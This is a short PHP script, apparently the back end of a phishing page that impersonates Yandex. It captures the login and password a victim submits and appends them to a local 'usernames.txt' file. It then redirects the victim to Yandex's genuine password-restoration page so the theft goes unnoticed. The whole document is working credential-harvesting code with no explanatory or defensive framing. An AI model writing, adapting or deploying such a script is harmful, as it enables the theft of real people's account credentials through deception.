<?php

file_put_contents("../userpass/usernames.txt", "Yandex Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://passport.yandex.com/restoration');
exit();
?>